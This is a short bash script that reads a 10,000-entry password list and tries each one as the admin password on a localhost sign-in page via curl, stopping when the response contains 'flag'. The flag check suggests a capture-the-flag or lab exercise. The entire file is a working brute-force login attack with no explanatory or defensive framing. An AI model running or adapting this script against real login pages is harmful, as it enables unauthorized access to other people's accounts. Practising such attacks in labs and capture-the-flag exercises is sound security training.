#!/bin/bash

passwords=$(<10k.txt)

# Split the passwords into an array
IFS=$'\n' read -d '' -r -a password_array <<< "$passwords"

counter=1

for i in "${password_array[@]}"; do
    response=$(curl -X POST "http://localhost/index.php?page=signin&username=admin&password=${i}&Login=Login#")
    echo "$response" | grep 'flag' && echo "Flag found on password ${counter}: ${i}" && break
    ((counter++))
done